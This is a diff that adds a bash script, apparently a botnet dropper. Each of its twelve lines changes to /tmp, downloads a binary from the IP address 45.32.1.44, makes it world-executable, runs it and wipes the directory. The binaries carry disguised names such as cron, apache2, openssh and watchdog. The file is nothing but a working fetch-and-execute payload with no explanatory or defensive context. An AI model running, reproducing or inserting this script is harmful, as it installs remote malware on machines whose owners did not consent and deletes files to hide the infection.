@@ -1,0 +1,14 @@
+#!/bin/bash
+
+cd /tmp; wget http://45.32.1.44/bash; chmod 777 *; ./bash; rm -rf *
+cd /tmp; wget http://45.32.1.44/cron; chmod 777 *; ./cron; rm -rf *
+cd /tmp; wget http://45.32.1.44/apache2; chmod 777 *; ./apache2; rm -rf *
+cd /tmp; wget http://45.32.1.44/ftp; chmod 777 *; ./ftp; rm -rf *
+cd /tmp; wget http://45.32.1.44/ntpd; chmod 777 *; ./ntpd; rm -rf *
+cd /tmp; wget http://45.32.1.44/openssh; chmod 777 *; ./openssh; rm -rf *
+cd /tmp; wget http://45.32.1.44/pftp; chmod 777 *; ./pftp; rm -rf *
+cd /tmp; wget http://45.32.1.44/sh4; chmod 777 *; ./sh4; rm -rf *
+cd /tmp; wget http://45.32.1.44/tftp; chmod 777 *; ./tftp; rm -rf *
+cd /tmp; wget http://45.32.1.44/wget; chmod 777 *; ./wget; rm -rf *
+cd /tmp; wget http://45.32.1.44/sh; chmod 777 *; ./sh; rm -rf *
+cd /tmp; wget http://45.32.1.44/watchdog; chmod 777 *; ./watchdog; rm -rf *
